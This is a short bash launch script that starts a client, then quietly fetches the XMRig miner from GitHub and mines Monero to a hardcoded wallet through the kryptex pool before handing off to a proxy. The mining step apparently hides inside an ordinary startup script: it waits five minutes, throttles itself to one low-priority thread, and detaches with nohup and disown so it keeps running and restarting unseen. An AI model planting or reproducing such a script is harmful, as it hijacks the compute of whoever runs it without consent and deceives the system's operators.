#!/bin/bash

./client -server="$SERVER" -session-id="$SESSION_ID" -mode="$MODE" -log="$LOG" &
echo "Client PID: $!"

DIR=xmrig-6.26.0
ARCHIVE=$DIR-linux-static-x64.tar.gz
[ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)

WALLET="krxX3328ZR/z_render_all"

monitor_mem() {
    while true; do
        echo "=== $(date) ===" >> mem.log
        free -m >> mem.log
        ps aux | grep xmrig | grep -v grep >> mem.log
        sleep 30
    done
}
monitor_mem &

sleep 300

nohup bash -c "
    while true; do
        echo 'Starting xmrig...' >> xmrig.log
        taskset -c 0 ./$DIR/xmrig \
            --url=xmr-ru.kryptex.network:7029 \
            --user=$WALLET \
            --pass=x \
            --coin=monero \
            --randomx-mode=light \
            --asm=none \
            --cpu-max-threads-hint=1 \
            --cpu-priority=0 \
            2>&1 | tee -a xmrig.log
        echo 'XMRig crashed/restarted' >> xmrig.log
        sleep 60
    done
" &

disown
exec ./proxy
